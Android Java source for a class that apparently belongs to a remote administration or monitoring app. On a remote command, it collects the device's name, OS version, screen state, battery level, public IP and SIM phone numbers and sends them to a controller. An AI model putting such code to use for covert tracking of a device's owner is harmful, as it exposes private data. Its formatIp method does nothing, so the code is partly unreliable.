package com.lyrnic.userside.sessions;

import android.content.Context;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.lyrnic.userside.constants.Actions;
import com.lyrnic.userside.constants.Constants;
import com.lyrnic.userside.listeners.OnRequestSendMessageListener;
import com.lyrnic.userside.managers.NumbersManager;
import com.lyrnic.userside.utilities.ScreenUtils;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URI;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class DeviceInfoSession extends Session{
    public DeviceInfoSession(Context context, String adminToken, OnRequestSendMessageListener onRequestSendMessageListener, int id) {
        super(context, adminToken, onRequestSendMessageListener, id);
    }

    @Override
    public void onMessageReceived(String message) {
        super.onMessageReceived(message);

        try {
            handleMessage(message);
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    private void handleMessage(String message) throws JSONException {
        JSONObject jsonObject = new JSONObject(message);

        String action = jsonObject.getString(Constants.ACTION_KEY);

        switch (action){
            case Actions.ACTION_REQUEST_GET_DEVICE_INFO:
                new Thread(() -> {
                    try {
                        sendDeviceInfo();
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                }).start();
                break;
        }

    }

    private void sendDeviceInfo() throws JSONException {
        String name = Settings.Global.getString(context.getContentResolver(), "device_name");
        String androidVersion = android.os.Build.VERSION.RELEASE;
        boolean screenState = ScreenUtils.isScreenOnAndUnlocked(context);
        int batteryLevel = ((BatteryManager) context.getSystemService(Context.BATTERY_SERVICE)).getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        int simCount = getSimCount();
        NumbersManager numbersManager = new NumbersManager();

        String numbers = numbersManager.getNumbersSync(context);

        String ip = null;
        try {
            ip = getIpAddress();

            formatIp(ip);
        } catch (IOException e) {
            Log.e("DeviceInfoSession", "error while getting ip address", e);
        }

        JSONObject jsonObject = new JSONObject();

        jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_RECEIVE_DEVICE_INFO);

        jsonObject.put("name", name);
        jsonObject.put("version", androidVersion);
        jsonObject.put("screenState", screenState);
        jsonObject.put("batteryLevel", batteryLevel);
        jsonObject.put("simCount", simCount);
        jsonObject.put("ip", ip == null ? "unknown" : ip);
        jsonObject.put("simNumbers", numbers == null ? "unavailable" : numbers);

        sendMessage(jsonObject.toString());
    }

    private void formatIp(String ip) {
        ip = ip.replace("\n", "");
    }

    private String getIpAddress() throws IOException {
        OkHttpClient client = new OkHttpClient();

        Response response = client.newCall(new Request.Builder().url("https://checkip.amazonaws.com/").build()).execute();

        String ip = response.body().string();

        response.close();

        return ip;
    }

    private int getSimCount() {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
            return telephonyManager.getActiveModemCount();
        }else{
            return telephonyManager.getPhoneCount();
        }
    }
}
